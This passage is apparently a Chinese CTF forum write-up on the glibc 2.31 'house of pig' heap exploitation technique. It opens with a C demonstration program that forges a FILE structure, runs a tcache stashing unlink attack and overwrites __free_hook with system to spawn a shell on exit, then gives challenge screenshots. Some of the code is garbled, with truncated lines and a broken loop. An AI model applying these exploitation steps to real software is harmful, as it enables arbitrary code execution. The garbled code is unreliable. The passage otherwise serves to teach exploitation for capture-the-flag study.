
```c
#include 
#include 
#include 

#define BLACK       "30"
#define RED         "31"
#define GREEN       "32"
#define YELLOW      "33"
#define BLUE        "34"
#define PURPLE      "35"
#define GREEN_DARK  "36"
#define WHITE       "37"

#define UNDEFINED   "-1"
#define HIGHLIGHT   "1"
#define UNDERLINE   "4"
#define SPARK       "5"

#define STR_END      "\033[0m"

void printf_color(char* color, char* effect, char* string){
    char buffer[0x1000] = {0};
    strcpy(buffer, "\033[");
    if(effect[0] != '-'){
        strcat(buffer, effect);
        strcat(buffer, ";");
    }
    strcat(buffer, color);
    strcat(buffer, "m");
    strcat(buffer, string);
    printf("%s" STR_END, buffer);
}

int main(){
    printf_color(GREEN, UNDEFINED, "今天我们来学习一下house of pig的利用原理。\n");
    printf_color(GREEN, UNDEFINED, "house of pig在只能使用calloc进行内存分配的CTF赛题中也有用武之地。\n");
    printf_color(GREEN, UNDEFINED, "首先我们了解一下这种利用方式的基本原理。\n");
    printf_color(GREEN, UNDEFINED, "本程序运行于ubuntu 20.04, glibc版本为2.31-0ubuntu9.9。\n");
    printf_color(GREEN, UNDEFINED, "在glibc 2.31下，house of pig需要利用__free__hook。\n\n");
    printf_color(RED, HIGHLIGHT, "第一步：获取libc的加载地址及堆地址。\n");
    printf_color(GREEN, UNDEFINED, "通过puts函数获取libc加载地址，在本libc中其偏移为0x84420。\n");

    size_t puts_addr = (size_t)puts;
    size_t libc_base = puts_addr - 0x84420;
    printf_color(YELLOW, HIGHLIGHT, "libc的加载地址为：");
    printf("\033[" HIGHLIGHT ";" YELLOW "m%#zx\n" STR_END, libc_base);

    printf_color(GREEN, UNDEFINED, "然后我们通过分配一个chunk（大小为0x500）来获得一个堆地址。\n");
    size_t chunk_1 = (size_t) malloc(0x4F0) - 0x10;
    printf_color(YELLOW, HIGHLIGHT, "获得堆地址为这个chunk的起始地址：");
    printf("\033[" HIGHLIGHT ";" YELLOW "m%#zx\n\n" STR_END, chunk_1);

    printf_color(RED, HIGHLIGHT, "第二步：通过large bin attack或其他方法将__free_hook附近写上一个堆地址。\n");
    printf_color(GREEN, UNDEFINED, "为了方便起见，本程序直接对__free_hook附近地址进行修改。\n");
    printf_color(GREEN, UNDEFINED, "在实际应用中，我们要维护好这个堆地址，在后面的步骤中还会用到。\n");
    printf_color(PURPLE, HIGHLIGHT, "这里在__free_hook-0x10处写入刚才获得的堆地址。\n");

    printf_color(GREEN, UNDEFINED, "本libc中__free_hook的偏移为0x1EEE48。\n");

    size_t __free_hook = libc_base + 0x1EEE48;
    printf_color(YELLOW, HIGHLIGHT, "__free_hook的地址为：");
    printf("\033[" HIGHLIGHT ";" YELLOW "m%#zx\n" STR_END, __free_hook);

    size_t* vuln_1 = (size_t*)(__free_hook - 0x8);
    // ---------- 第一处漏洞利用 ---------- //
    *vuln_1 = chunk_1;
    // --------------------------------- //

    printf_color(BLUE, HIGHLIGHT, "第一处漏洞利用完成，已在__free_hook-0x10处写入堆地址。\n\n");

    printf_color(RED, HIGHLIGHT, "第三步：通过large bin attack或其他方法向_IO_list_all写入一个堆地址。\n");
    printf_color(GREEN, UNDEFINED, "本libc中__free_hook的偏移为0x1ED5A0。\n");

    size_t* _IO_list_all = (size_t*)(libc_base + 0x1ED5A0);

    printf_color(GREEN, UNDEFINED, "_IO_list_all中原本保存的应该是_IO_2_1_stderr_这个文件结构体实例。\n");
    printf_color(GREEN, UNDEFINED, "在程序调用exit函数时会对_IO_list_all中的FILE结构体依次进行遍历。\n");
    printf_color(GREEN, UNDEFINED, "exit函数的调用链为：exit->_IO_cleanup->_IO_flush_all_lockp。\n");
    printf_color(GREEN, UNDEFINED, "下面是_IO_flush_all_lockp的函数定义：\n\n");
    printf_color(BLUE, HIGHLIGHT, "(/libio/genops.c， line 684)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "int\n"
                 "_IO_flush_all_lockp (int do_lock)\n"
                 "{\n"
                 "  int result = 0;\n"
                 "  FILE *fp;\n"
                 "\n"
                 "#ifdef _IO_MTSAFE_IO\n"
                 "  _IO_cleanup_region_start_noarg (flush_cleanup);\n"
                 "  _IO_lock_lock (list_all_lock);\n"
                 "#endif\n"
                 "\n"
                 "  \033[1;31mfor (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)\n"
                 "    {\n"
                 "      run_fp = fp;\n"
                 "      if (do_lock)\n"
                 "\t_IO_flockfile (fp);\n"
                 "\n"
                 "      if (((fp->_mode _IO_write_ptr > fp->_IO_write_base)\n"
                 "\t   || (_IO_vtable_offset (fp) == 0\n"
                 "\t       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr\n"
                 "\t\t\t\t    > fp->_wide_data->_IO_write_base))\n"
                 "\t   )\n"
                 "\t  && _IO_OVERFLOW (fp, EOF) == EOF)\n"
                 "\tresult = EOF;\n"
                 "\n"
                 "      if (do_lock)\n"
                 "\t_IO_funlockfile (fp);\n"
                 "      run_fp = NULL;\n"
                 "    }\n\033[1;" PURPLE "m"
                 "\n"
                 "#ifdef _IO_MTSAFE_IO\n"
                 "  _IO_lock_unlock (list_all_lock);\n"
                 "  _IO_cleanup_region_end (0);\n"
                 "#endif\n"
                 "\n"
                 "  return result;\n"
                 "}\n\n");
    printf_color(GREEN, UNDEFINED, "注意红色部分的代码，这便是遍历_IO_list_all链中的所有FILE实例。\n");
    printf_color(GREEN, UNDEFINED, "其中一条if语句的判断条件中会调用_IO_OVERFLOW函数。\n");
    printf_color(GREEN, UNDEFINED, "这个函数指的是vtable中overflow那个字段对应的函数。\n");
    printf_color(GREEN, UNDEFINED, "要执行到这个函数，就必须要让前面一个判断条件满足。\n");
    printf_color(GREEN, UNDEFINED, "这也就是我们伪造FILE结构体时需要注意的地方。\n");
    printf_color(GREEN, UNDEFINED, "下面我们就来修改_IO_list_all的值，用一个chunk地址填充。\n");

    size_t chunk_2 = (size_t) calloc(1, 0xF0) - 0x10;
    // ---------- 第二处漏洞利用 ---------- //
    *_IO_list_all = chunk_2;
    // --------------------------------- //
    printf_color(YELLOW, HIGHLIGHT, "这个chunk的起始地址为：");
    printf("\033[" HIGHLIGHT ";" YELLOW "m%#zx\n" STR_END, chunk_2);

    printf_color(RED, HIGHLIGHT, "第四步：伪造FILE结构体。\n");
    printf_color(GREEN, UNDEFINED, "我们使用第二次分配到的chunk作为假FILE结构体进行构造。\n");
    printf_color(GREEN, UNDEFINED, "再次强调注意_IO_flush_all_lockp函数的限定条件。\n");
    printf_color(GREEN, UNDEFINED, "if语句的前一个判断条件是两个判断相或，我们只需要满足第一个判断即可：\n");
    printf_color(RED, HIGHLIGHT, "fp->_mode _IO_write_ptr > fp->_IO_write_base\n");
    printf_color(GREEN, UNDEFINED, "其中_mode字段的偏移为0xC0，_IO_write_ptr为0x28，_IO_write_base为0x30。\n");
    printf_color(GREEN, UNDEFINED, "我们在_mode处填0，在_IO_write_ptr填1，在_IO_write_base填0就可以了。\n");

    size_t* fake_FILE = (size_t*) chunk_2;
    fake_FILE[0xC0 / 8] = 0;    // _mode
    fake_FILE[0x20 / 8] = 1;
    fake_FILE[0x28 / 8] = 0xFFFFFFFFFFFF;    // _IO_write_ptr
    fake_FILE[0x30 / 8] = 0;    // _IO_write_base

    printf_color(GREEN, UNDEFINED, "三个字段修改完成。但我们需要修改的可不止这三个字段。\n");
    printf_color(GREEN, UNDEFINED, "在这个判断条件通过后，我们将会进入overflow函数。\n");
    printf_color(GREEN, UNDEFINED, "house of pig的一个重要思想就是让其执行_IO_str_overflow函数。\n");
    printf_color(GREEN, UNDEFINED, "这需要我们在vtable中写入_IO_str_jumps的地址，其中保存有这个函数的地址。\n");
    printf_color(GREEN, UNDEFINED, "看一下IDA中的_IO_str_jumps结构体：\n\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "__libc_IO_vtables:00000000001E9560 qword_1E9560    dq 0                    ; DATA XREF: sub_52C20+49A↑o\n"
                 "__libc_IO_vtables:00000000001E9560                                         ; sscanf+B5↑o ...\n"
                 "__libc_IO_vtables:00000000001E9568                 dq 0\n"
                 "__libc_IO_vtables:00000000001E9570                 dq offset sub_93D50\n"
                 "\033[1;31m__libc_IO_vtables:00000000001E9578                 dq offset _IO_str_overflow\n\033[1;" PURPLE "m"
                 "__libc_IO_vtables:00000000001E9580                 dq offset _IO_str_underflow\n"
                 "__libc_IO_vtables:00000000001E9588                 dq offset _IO_default_uflow\n"
                 "__libc_IO_vtables:00000000001E9590                 dq offset _IO_str_pbackfail\n"
                 "__libc_IO_vtables:00000000001E9598                 dq offset _IO_default_xsputn\n"
                 "__libc_IO_vtables:00000000001E95A0                 dq offset _IO_default_xsgetn\n"
                 "__libc_IO_vtables:00000000001E95A8                 dq offset _IO_str_seekoff\n"
                 "__libc_IO_vtables:00000000001E95B0                 dq offset sub_92600\n"
                 "__libc_IO_vtables:00000000001E95B8                 dq offset sub_924E0\n"
                 "__libc_IO_vtables:00000000001E95C0                 dq offset sub_92870\n"
                 "__libc_IO_vtables:00000000001E95C8                 dq offset _IO_default_doallocate\n"
                 "__libc_IO_vtables:00000000001E95D0                 dq offset sub_937F0\n"
                 "__libc_IO_vtables:00000000001E95D8                 dq offset sub_93800\n"
                 "__libc_IO_vtables:00000000001E95E0                 dq offset sub_937D0\n"
                 "__libc_IO_vtables:00000000001E95E8                 dq offset sub_92870\n"
                 "__libc_IO_vtables:00000000001E95F0                 dq offset sub_937E0\n"
                 "__libc_IO_vtables:00000000001E95F8                 dq offset sub_93810\n"
                 "__libc_IO_vtables:00000000001E9600                 dq offset sub_93820\n\n");

    printf_color(GREEN, UNDEFINED, "其偏移为0x1E9560。将其填充到vtable字段，偏移为0xD8。\n");
    size_t _IO_str_jumps = libc_base + 0x1E9560;
    fake_FILE[0xD8 / 8] = _IO_str_jumps;

    printf_color(GREEN, UNDEFINED, "然后，我们进入_IO_str_overflow函数看看。\n\n");
    printf_color(BLUE, HIGHLIGHT, "(/libio/strops.c, line 80)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "int\n"
                 "_IO_str_overflow (FILE *fp, int c)\n"
                 "{\n"
                 "  int flush_only = c == EOF;\n"
                 "  size_t pos;\n"
                 "  if (fp->_flags & _IO_NO_WRITES)\n"
                 "      return flush_only ? 0 : EOF;\n"
                 "  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))\n"
                 "    {\n"
                 "      fp->_flags |= _IO_CURRENTLY_PUTTING;\n"
                 "      fp->_IO_write_ptr = fp->_IO_read_ptr;\n"
                 "      fp->_IO_read_ptr = fp->_IO_read_end;\n"
                 "    }\n"
                 "  pos = fp->_IO_write_ptr - fp->_IO_write_base;\n"
                 "  if (pos >= (size_t) (_IO_blen (fp) + flush_only))\n"
                 "    {\n"
                 "      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */\n"
                 "\treturn EOF;\n"
                 "      else\n"
                 "\t{\n"
                 "\033[1;31m\t  char *new_buf;\n"
                 "\t  char *old_buf = fp->_IO_buf_base;\n"
                 "\t  size_t old_blen = _IO_blen (fp);\n"
                 "\t  size_t new_size = 2 * old_blen + 100;\n"
                 "\t  if (new_size _IO_buf_base = NULL;\n"
                 "\t    }\n\033[1;" PURPLE "m"
                 "\t  memset (new_buf + old_blen, '\\0', new_size - old_blen);\n"
                 "\n"
                 "\t  _IO_setb (fp, new_buf, new_buf + new_size, 1);\n"
                 "\t  fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);\n"
                 "\t  fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);\n"
                 "\t  fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);\n"
                 "\t  fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);\n"
                 "\n"
                 "\t  fp->_IO_write_base = new_buf;\n"
                 "\t  fp->_IO_write_end = fp->_IO_buf_end;\n"
                 "\t}\n"
                 "    }\n"
                 "\n"
                 "  if (!flush_only)\n"
                 "    *fp->_IO_write_ptr++ = (unsigned char) c;\n"
                 "  if (fp->_IO_write_ptr > fp->_IO_read_end)\n"
                 "    fp->_IO_read_end = fp->_IO_write_ptr;\n"
                 "  if (flush_only)\n"
                 "    return 0;\n"
                 "  else\n"
                 "    return c;\n"
                 "}\n\n");

    printf_color(GREEN, UNDEFINED, "注意红色部分的代码，这里会连续调用malloc、memcpy、free函数。\n");
    printf_color(GREEN, UNDEFINED, "house of pig想要在这里大做文章。\n");
    printf_color(GREEN, UNDEFINED, "首先需要通过tcache stashing unlink attack或其他方法向tcache中插入__free_hook附近的地址。\n");
    printf_color(GREEN, UNDEFINED, "然后在运行到此时，首先通过malloc分配出来，然后memcpy将指定位置的内容复制到__free_hook。\n");
    printf_color(GREEN, UNDEFINED, "最后通过free函数执行__free_hook中的内容，这里将__free_hook修改为system函数地址。\n");
    printf_color(GREEN, UNDEFINED, "通过代码我们可以知道，memcpy是将_IO_buf_base（结构体内偏移0x38）地址处的内容复制到__free_hook。\n");
    printf_color(GREEN, UNDEFINED, "而这个复制的原地址是我们可控的，需要我们在伪造的FILE结构体中设置。\n");
    printf_color(GREEN, UNDEFINED, "这里我们设置这个地址的值为第一个chunk的地址+0x20。\n");
    printf_color(GREEN, UNDEFINED, "............\n");

    fake_FILE[0x38 / 8] = chunk_1 + 0x20;

    printf_color(GREEN, UNDEFINED, "设置完成。之后我们需要注意malloc函数申请的chunk大小，其申请的大小需要经过计算。\n");
    printf_color(GREEN, UNDEFINED, "计算方式是：(_IO_buf_end - _IO_buf_base) * 2 + 100。\n");
    printf_color(GREEN, UNDEFINED, "这要求我们正确设置_IO_buf_end的值。如果使用0x100的tcache进行攻击，则end-base=0x46。\n");
    printf_color(GREEN, UNDEFINED, "据此设置_IO_buf_end为第一个chunk的地址+0x20+0x46（结构体内偏移0x40）。\n");
    printf_color(GREEN, UNDEFINED, "............\n");

    fake_FILE[0x40 / 8] = chunk_1 + 0x20 + 0x46;

    printf_color(GREEN, UNDEFINED, "设置完成。最后注意free函数的参数是FILE结构体的起始地址，因此在第二个chunk+0x20处写入\"/bin/sh\\x00\"。\n");
    printf_color(GREEN, UNDEFINED, "另外在第二个chunk+0x30处写入system函数地址，memcpy函数能够将这里的地址复制到__free_hook。\n");

    strcpy((char*)(chunk_1 + 0x20), "/bin/sh");
    *(size_t*)(chunk_1 + 0x20 + 0x10) = (size_t)system;

    printf_color(GREEN, UNDEFINED, "............\n");
    printf_color(GREEN, UNDEFINED, "设置完成。\n\n");

    printf_color(RED, HIGHLIGHT, "第五步：通过tcache stashing unlink attack在tcache写入__free_hook附近地址。\n");
    printf_color(GREEN, UNDEFINED, "当赛题中只使用calloc时，只有在tcache中存放堆地址，才能让malloc分配到__free_hook。\n");
    printf_color(GREEN, UNDEFINED, "下面进行这种攻击的常规流程：\n");
    printf_color(GREEN, UNDEFINED, "首先分配9个chunk并释放，7个到tcache，2个到small bins。然后分配两个tcache chunk出来。\n");

    void* chunks[9];

    for(int i=0; i6->5->4->3->2->1。\n");
    printf_color(GREEN, UNDEFINED, "unsorted bin中的chunk应该为：98。\n");
    printf_color(GREEN, UNDEFINED, "然后分配出来两个tcache chunk，再分配一个较大的chunk，让unsorted bin的两个chunk进入small bins。\n");
    printf_color(GREEN, UNDEFINED, "应该修改第9个chunk的bk指针为__free_hook附近地址。\n");
    printf_color(GREEN, UNDEFINED, "............\n");

    *(size_t*)((size_t)(chunks[8]) + 0x8) = __free_hook - 0x20;

    printf_color(GREEN, UNDEFINED, "修改完成，之后分配一个出来进行攻击。\n");
    calloc(1, 0xF0);

    printf_color(GREEN, UNDEFINED, "已经分配出来了一个chunk，现在0x100的tcache中的第一个chunk就是__free_hook附近的地址。\n\n");

    printf_color(RED, HIGHLIGHT, "第六步：调用exit函数触发house of pig漏洞。\n");
    printf_color(GREEN, UNDEFINED, "现在，所有的东西都已经布置好了，只需要一个exit函数，我们就能够执行预期的函数调用链并getshell。\n");
    exit(-1);
}
```

# [XCTF2021final] house of pig

## 检查信息

![image-20231028104920747.png](https://attach.52pojie.cn/forum/202310/30/171249k0crec9ccs92z279.png)

`image-20231028104920747.png`（86.9 KB，下载次数：3）  
2023-10-30 17:12 上传

[附件下载](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY1MjYxM3w5NmI2MjAyMXwxNzkzNTczMDQwfDE2ODA4NnwxODUwNDcw&nothumb=yes)

![image-20231028104935630.png](https://attach.52pojie.cn/forum/202310/30/171311kd4xla2w2xvcoyc6.png)

`image-20231028104935630.png`（67.63 KB，下载次数：1）  
2023-10-30 17:13 上传

[附件下载](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY1MjYxNHw2OGYyNzU3N3wxNzkzNTczMDQwfDE2ODA4NnwxODUwNDcw&nothumb=yes)

![image-20231028105055649.png](https://attach.52pojie.cn/forum/202310/30/171326m454lec48alqqqbc.png)

`image-20231028105055649.png`（34.53 KB，下载次数：3）  
2023-10-30 17:13 上传

[附件下载](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY1MjYxNXxmZTVlNTEyNnwxNzkzNTczMDQwfDE2ODA4NnwxODUwNDcw&nothumb=yes)

没找到原 `libc`，这里使用如上 `libc`。

## 试运行

![image-20231028105250592.png](https://attach.52pojie.cn/forum/202310/30/171346mcatccytf6ktjypy.png)

`image-20231028105250592.png`（134.58 KB，下载次数：1）  
2023-10-30 17:13 上传

[附件下载](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY1MjYxNnw2Zjk0MzQzZHwxNzkzNTczMDQwfDE2ODA4NnwxODUwNDcw&nothumb=yes)

## 逆向分析
